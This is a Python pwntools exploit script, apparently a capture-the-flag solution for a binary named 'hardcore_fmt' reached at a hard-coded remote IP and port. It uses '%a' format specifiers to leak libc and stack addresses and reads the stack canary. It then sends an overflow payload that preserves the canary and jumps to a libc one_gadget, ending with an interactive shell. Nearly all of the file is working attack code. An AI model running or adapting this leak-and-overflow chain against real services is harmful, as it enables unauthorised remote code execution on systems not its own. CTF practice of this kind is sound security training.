from pwn import *
from ctypes import *
import struct

address = '39.106.110.69'
port = 9999
binary = './hardcore_fmt'
lib = './libc-2.27.so'

context.aslr = True
context.binary = binary
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'DEBUG'

def s(a): return p.send(a)
def sa(a,b): return p.sendafter(a,b)
def sl(a): return p.sendline(a)
def sla(a,b): return p.sendlineafter(a, b)


def r(a): return p.recv(a)
def rl(): return p.recvline()
def ru(a): return p.recvuntil(a)

def i(ss):
    log.info("%s: 0x%x" % (ss, eval(ss)))


#p = process(binary, env={'LD_PRELOAD':lib})
p = remote(address, port)
sla('hard-core fmt\n', '%a'*4)
ss = r(4096)
addr1 = ss[34:34+10] + '00'
addr2 = ss[55:55+10] + '00'
print '[+] addr1: %x ' % int(addr1,16 )
print '[+] addr2: %x ' % int(addr2,16 )
libc_addr = int(addr1,16 ) - 0x61A100
canary_addr =  int(addr2,16 ) + 0x29
print '[+] libc_addr: %x ' % libc_addr
print '[+] canary_addr: %x ' % canary_addr
sl(str(canary_addr))
ru(': ')
canary = u64(r(7).rjust(8,'\x00'))
print '[+] canary found!'
# sleep(5)
print '[+] canary: %x' % canary
s('A' * (0x118-0x10) + p64(canary) + p64(0xdeadbeef) * 3 + p64(libc_addr+0x4f2c5)) # one_gadget
r(4096)
p.interactive()
